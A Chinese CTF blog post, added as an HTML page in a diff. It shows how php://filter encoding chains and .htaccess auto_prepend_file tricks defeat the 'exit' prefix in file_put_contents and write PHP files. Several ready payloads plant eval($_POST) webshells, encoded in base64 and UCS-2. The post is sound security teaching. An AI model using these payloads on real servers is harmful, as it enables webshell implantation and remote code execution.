@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>file_put_content和死亡·杂糅代码之缘 | s1mple</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="s1mple">
+    <meta name="author" content="s1mple">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">s1mple</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2020-11-18T05:07:29.000Z" itemprop="datePublished">
+          2020-11-18
+      </time>
+    
+</span>
+                <h1>file_put_content和死亡·杂糅代码之缘</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="首发先知：：-https-xz-aliyun-com-t-8163"><a href="#首发先知：：-https-xz-aliyun-com-t-8163" class="headerlink" title="首发先知：： https://xz.aliyun.com/t/8163"></a><strong>首发先知：： <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></strong></h2><p>之前打了WMCTF，题目还行，只是非预期很快乐，比赛时checkin2感觉很有意思，就来思考个专题；</p>
+<p>首先来说，file_put_content大概有三种情形出现；</p>
+<p><code>file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</code></p>
+<p><code>file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</code></p>
+<p><code>file_put_contents($filename,$content . &quot;\nxxxxxx&quot;);</code></p>
+<p> 这里我们的思路一般是想要将杂糅或者死亡代码分解掉；这里思路基本上都是利用php伪协议filter，结合编码或者相应的过滤器进行绕过；其原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码；</p>
+<h2 id="首先对于第一种情况"><a href="#首先对于第一种情况" class="headerlink" title="首先对于第一种情况"></a><strong>首先对于第一种情况</strong></h2><p>直观的看到，我们的文件名和文件内容都是可控的，这种的相对来说简单的多，我们直接控制文件名，和文件内容即可，下面分享几种方式；</p>
+<h2 id="1-base64编码绕过"><a href="#1-base64编码绕过" class="headerlink" title="1.   base64编码绕过"></a>1.   <strong>base64编码绕过</strong></h2><p>原理其实很简单，利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=<span class="string">&#x27;php://filter/convert.base64-decode/resource=s1mple.php&#x27;</span>;</span><br><span class="line">$content = <span class="string">&#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里之所以将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化；载荷效果如下：</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPLN4K.png" alt="dPLN4K.png"></p>
+<h2 id="2-rot13-编码绕过"><a href="#2-rot13-编码绕过" class="headerlink" title="2.  rot13 编码绕过"></a>2.  <strong>rot13 编码绕过</strong></h2><p>原理和base64一样，可以直接转码分解死亡代码；这里不再多说；直接看如下实验结果即可；</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPLd3D.png" alt="dPLd3D.png"></p>
+<p>只是这种方法有点尴尬的是；因为我们生成的文件内容之中前面的<code>&lt;?</code>并没有分解掉，这时，如果服务器开启了短标签，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用；</p>
+<h2 id="3-htaccess的预包含利用"><a href="#3-htaccess的预包含利用" class="headerlink" title="3.    .htaccess的预包含利用"></a><strong>3.    .htaccess的预包含利用</strong></h2><p>利用 .htaccess的预包含文件的功能来进行攻破；自定义包含我们的flag文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename=php:<span class="comment">//filter/write=string.strip_tags/resource=.htaccess</span></span><br><span class="line"></span><br><span class="line">$content=<span class="meta">?&gt;</span>php_value%<span class="number">20</span>auto_prepend_file%<span class="number">20</span>G:\s1mple.php</span><br></pre></td></tr></table></figure>
+
+<p>同时传入如上的代码，首先来解释$filename的代码，这里引用了string.strip_tags过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；$content即闭合死亡代码使其完全消除，并且写入自定义包含文件；实验结果如下所示：</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHLCD.png" alt="dPHLCD.png"></p>
+<p>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜  flag.php flag  /flag  /flag.php 等等；另外还有个很大的问题是，string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器；</p>
+<h2 id="4-过滤器编码组合拳"><a href="#4-过滤器编码组合拳" class="headerlink" title="4.  过滤器编码组合拳"></a>4.  <strong>过滤器编码组合拳</strong></h2><p>过滤器组合拳，其实故名思意，就是利用过滤器嵌套过滤器进行过滤，以此达到代码的层层更迭，从而最后写入我们期望的代码；</p>
+<p><strong>先来一种：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php&#x27;</span></span><br><span class="line">$content=<span class="string">&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，利用string.strip_tags可以过滤掉html标签，将标签内的所有内容进行删去，然后再进行base64解码，成功写入shell；</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPLobn.png" alt="dPLobn.png"></p>
+<p>但是这种方法有一定的局限性也还是因为string.strip_tags在php7.3.0以上的环境下会发生段错误，从而导致无法写入，但是在php5的环境下则不受此影响；</p>
+<p><strong>再来另外一种</strong></p>
+<p>如果题目的环境是php7的话，那么我们又该如何？这里受一个题目的启发，也可以使用过滤器进行嵌套来做；组合拳；这里三个过滤器叠加之后先进行压缩，然后转小写，最后解压，会导致部分死亡代码错误；则可以写入shell；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php</span></span><br><span class="line">$content=php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0dphpinfo();<span class="meta">?&gt;</span>/resource=s1mple.php</span></span><br></pre></td></tr></table></figure>
+
+<p>如此便可以写入；其原理也很简单，就是利用过滤器嵌套让死亡代码在各种变换之间进行分解扰乱，然后再次写入木马；</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHcNT.png" alt="dPHcNT.png"></p>
+<p>这里非常巧合的是内容经过压缩转小写然后解压之后，我们的目的代码并没有发生变化，这也为写入木马奠定了基础；</p>
+<h2 id="介绍完第一种情况之后，就来介绍第二种情况"><a href="#介绍完第一种情况之后，就来介绍第二种情况" class="headerlink" title="介绍完第一种情况之后，就来介绍第二种情况"></a><strong>介绍完第一种情况之后，就来介绍第二种情况</strong></h2><p><code>file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</code>如此又该如何；</p>
+<p> 这段类似的代码在ThinkPHP5.0.X反序列化中出现过，利用其组合才能够得到RCE。有关ThinkPHP5.0.x的反序列化这里就不说了，主要是探索如何利用php://filter绕过该限制写入shell后门得到RCE的过程。 </p>
+<p>面对这种情况，就和WMCTF的一个题基本一样了；和上面的大类方法一样，也是利用php伪协议filter进行嵌套过滤器进行消除死亡代码，然后进行shell的写入或者读取；不过这种因为是一个变量，所以其限制代码为<code>&lt;?php exit()</code>;  然而我们之前说到的是因为是控制两个变量，在这种情况之下就为<code>&lt;?php exit();?&gt;</code>,两者有本质的区别，然而第一种情况下，后面的几种解法，其实从某种程度上来说，也是将其看成了一个变量从而的出的payload；</p>
+<p>这里题目环境如果在php7下，wmctf的wp上已经写的很清楚了，有多种方法可以绕过去；这里不再过多的解释；</p>
+<p>但是这里想要分享的一个另类的方法，如果题目环境不是在php7下，并且过滤了zlib的话，又该如何去解答，再使用过滤器去压缩和解压就不太可能实现了；这里提供一种我新实验成的方法，利用.htaccess进行预包含，然后读取flag；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php:<span class="comment">//filter/write=string.strip_tags/<span class="meta">?&gt;</span>php_value%20auto_prepend_file%20G:\s1mple.php%0a%23/resource=.htaccess</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以直接自定义预包含文件，进行测试；结果如下；</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHRCF.png" alt="dPHRCF.png"></p>
+<p>再次访问页面即可包含flag文件，进行读取；主要还是利用.htaccess的功效；（之前我也写有文章，感兴趣的师傅可以看看）</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHXgH.png" alt="dPHXgH.png"></p>
+<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a><strong>Base64</strong></h2><p>看到这种情况其实也可以想到base64利用，payload：：</p>
+<p><code>php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php</code>或者</p>
+<p><code>php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></p>
+<p>看起来顺理成章，进行拼接之后就是<code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code>然后会对其进行一次整体的base64-decode。从而分解掉死亡代码，但是有个小问题，当时我也有点不解，一直无法生成content；虽然文件创建成功，但是就是无法生成content。翻了翻cyc1e师傅的文章，和其他文章 ，发现问题在于‘=’；</p>
+<p>都知道‘=’在base64中的作用是填充，也就是以为着结束；在‘=’的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的。如下图所示；</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHW34.png" alt="dPHW34.png"></p>
+<p>这里因为是由于‘=’从而使得我们写入content不成功，那么我们可以想个方法去掉等号即可，</p>
+<h2 id="去掉等号之过滤器嵌套base64"><a href="#去掉等号之过滤器嵌套base64" class="headerlink" title="去掉等号之过滤器嵌套base64"></a><strong>去掉等号之过滤器嵌套base64</strong></h2><p>payload：  <code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code>如此payload我们测试看看载荷效果；</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPL0jH.png" alt="dPL0jH.png"></p>
+<p>发现可以生成文件，并且可以看到我们已经成功写入了shell；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；</p>
+<p>改payload为此：<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>我们将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成s1mple.php文件；从而就可以生成正常的文件名；载荷效果如下：</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPLDud.png" alt="dPLDud.png"></p>
+<h2 id="去掉等号之直接对内容进行变性另类base64"><a href="#去掉等号之直接对内容进行变性另类base64" class="headerlink" title="去掉等号之直接对内容进行变性另类base64"></a><strong>去掉等号之直接对内容进行变性另类base64</strong></h2><p>其实这种也是借助于过滤器，但是原理并不是和之前的原理一样，之前的原理即是：闭合原本的死亡代码，然后在进行过滤器过滤掉内容中的html标签，从而对剩下的内容进行base64解码。但是这种方法却不是如此，payload如下：</p>
+<p><code>php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p>
+<p>这种方法也是新奇，在一片文章中发现，但是他的payload无法进行攻击成功，我借助其思路重新构造了一个新的payload；这种payload的攻击原理即是首先直接在内容时，就将我们base64遇到的‘=’这个问题直接写在<code>&lt;? ?&gt;</code>中进行过滤掉，然后base64-decode再对原本内容的<code>&lt;?php exit();</code>进行转码，从而达到分解死亡代码的效果；这是两种攻击思路；</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPLFXj.png" alt="dPLFXj.png"></p>
+<h2 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a><strong>rot13</strong></h2><p>尽管base64比较特别，但是并不是所有的编码都受限于‘=’，这里可以采用rot13编码即可；</p>
+<p><code> php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=s1mple.php</code>这里<code>&lt;?php phpinfo();?&gt;</code>的rot13编码即为<code>&lt;?cuc cucvasb();?&gt;</code>,所以这里可以进行写入；载荷效果如下：</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPH5uR.png" alt="dPH5uR.png"></p>
+<p>其原理就是利用转码从而将原本的死亡代码进行转码从而使引擎无法识别从而避免死亡代码；</p>
+<h2 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv."></a><strong>convert.iconv.</strong></h2><p>这个过滤器需要 php 支持 <code>iconv</code>，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。 然而 我们可以留意到 <code>iconv — 字符串按要求的字符编码来转换 </code>;;其用法：<code>iconv ( string $in_charset , string $out_charset , string $str ) : string</code>   将字符串 <code>str</code> 从 <code>in_charset</code> 转换编码到 <code>out_charset</code>。 就其功能而论，有点类似于<code>base_convert</code>的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；（可以类比）；由此记得国赛的一道love_math的题目，有了base_convert之后就可以尽情的转换从而getshell；</p>
+<p>那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；</p>
+<h3 id="1-usc-2"><a href="#1-usc-2" class="headerlink" title="1.usc-2"></a><strong>1.usc-2</strong></h3><p>通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHID1.png" alt="dPHID1.png"></p>
+<p>payload：<code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php</code>;其实也是变向的转换回来，从而利用那一次转换对死亡代码进行扰乱；载荷效果如下：</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHoHx.png" alt="dPHoHx.png"></p>
+<h3 id="2-usc-4"><a href="#2-usc-4" class="headerlink" title="2.usc-4"></a><strong>2.usc-4</strong></h3><p>活用convert.iconv。可以进行usc-4编码转化；就是4位一反转；类比可知，构造的shell代码应该是usc-4中的4倍数；</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPH7E6.png" alt="dPH7E6.png"></p>
+<p>通过测试我们可以明确的看到确实是需要是4的倍数才可以进行，否则会进行报错；</p>
+<p>payload：<code>php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</code>荷载效果如下：</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHHUK.png" alt="dPHHUK.png"></p>
+<h3 id="3-utf-8与utf-7之间的转化"><a href="#3-utf-8与utf-7之间的转化" class="headerlink" title="3.utf-8与utf-7之间的转化"></a>3.utf-8与utf-7之间的转化</h3><p>经过测试发现如下的现象：</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHb4O.png" alt="dPHb4O.png"></p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPLfgg.png" alt="dPLfgg.png"></p>
+<p>这里发现生成的是<code>+AD0-</code>,然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以使用这种方法避免等号对我们base64解码的影响；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shell；算上是一种组合拳；</p>
+<p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php </code> 载荷效果如下：</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPzFjU.png" alt="dPzFjU.png"></p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPzAuF.png" alt="dPzAuF.png"></p>
+<h2 id="第三种情况"><a href="#第三种情况" class="headerlink" title="第三种情况"></a><strong>第三种情况</strong></h2><p><code>file_put_contents($filename,$content . &quot;\nxxxxxx&quot;);</code></p>
+<p>面对此情况相对来说要比之前的两种还要在某种程度上来说要简单一点，我们只需要让后面的杂糅代码注释掉，或者分解掉都是可以的，目的就是不让杂糅代码干扰；</p>
+<p>这种情形一般考点都是禁止有特殊起始符和结束符号的语言，举个例子，如果题目没有ban掉php，那么我们可以轻而易举的写入php代码，因为php代码有特殊的起始符和结束符，所以后面的杂糅代码，并不会对其产生什么影响，载荷效果如下：</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPLLCT.png" alt="dPLLCT.png"></p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHjvd.png" alt="dPHjvd.png"></p>
+<p>所以这类问题的考点，往往在于我们没有办法去写入这类的有特殊起始符和结束符号的语言，往往是需要想办法处理掉杂糅代码的；常见的考点是利用.htaccess进行操作；都知道，.htaccess文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用注释符将杂糅的代码进行注释，然后才可以正常访问；</p>
+<p>这里对于换行符我们直接进行 <code>\</code> 注释即可。然后再嵌入#注释符，从而达到单行注释就可以将杂糅代码注释掉的效果；载荷效果如下</p>
+<p><img src="https://s1.ax1x.com/2020/08/14/dPHxKA.png" alt="dPHxKA.png"></p>
+<p>可以发现直接利用，对于这种没有unlink的题目，我们也是可以反复写入.htaccess进行覆盖的，但是前提是我们写入的.htaccess文件格式不能出现错误，如果出现错误，则会触发报错，题目就会锁死。所以对待此类问题应当小心谨慎；回到刚才，我们可以反复的写入，那么我们就可以方法很多；具体看我之前的一两篇文章即可；</p>
+<p> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.html">https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.html</a> </p>
+<p> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13232888.html">https://www.cnblogs.com/Wanghaoran-s1mple/p/13232888.html</a> </p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h2><p>以上是我测试利用成功的三种情况下的利用方式，也写入了自己的新思路以及新型利用方式，都已经测试成功；另外至于组合拳，其实也是可以有多种方法，譬如各种编码相互转化，，甚至三种编码相互转化都是可以的；只要将过滤器和解码内容相对应即可，师傅们可以自行测试各种编码相互转化的组合拳；这里不在过多赘述了；</p>
+<p><strong>References</strong></p>
+<p> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510#h2-1">https://www.anquanke.com/post/id/202510#h2-1</a> </p>
+<p> <a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a> </p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    <a class="pull-left" href="/2020/11/18/%E7%A0%94%E7%A9%B6%E5%AF%B9%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%94%BB%E5%87%BB%E8%87%B3%E5%BD%B1%E5%93%8DFPM%E9%80%A0%E6%88%90RCE%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%96%B9%E6%B3%95/" style="float: left;">
+        ← 研究对中间件攻击至影响FPM造成RCE的四种方法
+    </a>
+    
+    
+    <a class="pull-right" href="/2020/11/18/Review-of-the-classic-sprintf-format-string-vulnerability/">
+        Review of the classic sprintf format string vulnerability →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
